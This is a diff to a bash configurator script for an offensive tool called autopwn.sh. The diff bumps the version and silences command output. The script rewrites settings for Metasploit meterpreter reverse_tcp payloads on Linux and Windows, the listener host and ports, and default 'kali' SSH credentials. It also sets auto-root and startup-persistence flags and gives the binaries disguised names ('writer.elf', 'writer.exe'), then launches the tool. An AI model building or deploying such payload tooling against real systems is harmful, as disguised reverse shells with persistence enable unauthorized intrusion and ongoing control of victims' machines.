@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version="1.8"
+version="1.9"
 
 # Variables
 youripalways=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
@@ -59,22 +59,22 @@ else
     clear
     chmod 777 autopwn.sh
 
-    replace "linux/x86/meterpreter/reverse_tcp" "$linuxpayload" -- autopwn.sh
-    replace "windows/meterpreter/reverse_tcp" "$windowspayload" -- autopwn.sh
-    replace 'lhost="127.0.0.1"' "lhost=\"$lhost\"" -- autopwn.sh
-    replace 'winlport="8181"' "winlport=\"$winlport\"" -- autopwn.sh
-    replace 'linlport="8080"' "linlport=\"$linlport\"" -- autopwn.sh
-    replace 'sshuser="kali"' "sshuser=\"$sshuser\"" -- autopwn.sh
-    replace 'sshpassword="kali"' "sshpassword=\"$sshpassword\"" -- autopwn.sh
-    replace 'winworkdir="Desktop"' "winworkdir=\"$winworkdir\"" -- autopwn.sh
-    replace 'linworkdir="Desktop"' "linworkdir=\"$linworkdir\"" -- autopwn.sh
-    replace 'sshstarttoo="si"' "sshstarttoo=\"$sshstarttoo\"" -- autopwn.sh
-    replace 'autoroot="si"' "autoroot=\"$autoroot\"" -- autopwn.sh
-    replace 'startup="si"' "startup=\"$startup\"" -- autopwn.sh
-    replace 'linuxoutname="writer.elf"' "linuxoutname=\"$linuxoutname\"" -- autopwn.sh
-    replace 'windowsoutname="writer.exe"' "windowsoutname=\"$windowsoutname\"" -- autopwn.sh
+    replace "linux/x86/meterpreter/reverse_tcp" "$linuxpayload" -- autopwn.sh > /dev/null 2>&1
+    replace "windows/meterpreter/reverse_tcp" "$windowspayload" -- autopwn.sh > /dev/null 2>&1
+    replace 'lhost="127.0.0.1"' "lhost=\"$lhost\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'winlport="8181"' "winlport=\"$winlport\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'linlport="8080"' "linlport=\"$linlport\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'sshuser="kali"' "sshuser=\"$sshuser\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'sshpassword="kali"' "sshpassword=\"$sshpassword\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'winworkdir="Desktop"' "winworkdir=\"$winworkdir\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'linworkdir="Desktop"' "linworkdir=\"$linworkdir\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'sshstarttoo="si"' "sshstarttoo=\"$sshstarttoo\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'autoroot="si"' "autoroot=\"$autoroot\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'startup="si"' "startup=\"$startup\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'linuxoutname="writer.elf"' "linuxoutname=\"$linuxoutname\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'windowsoutname="writer.exe"' "windowsoutname=\"$windowsoutname\"" -- autopwn.sh > /dev/null 2>&1
     clear
-    dos2unix autopwn.sh
+    dos2unix autopwn.sh > /dev/null 2>&1
     clear
     ./autopwn.sh
     kill $$ > /dev/null 2>&1
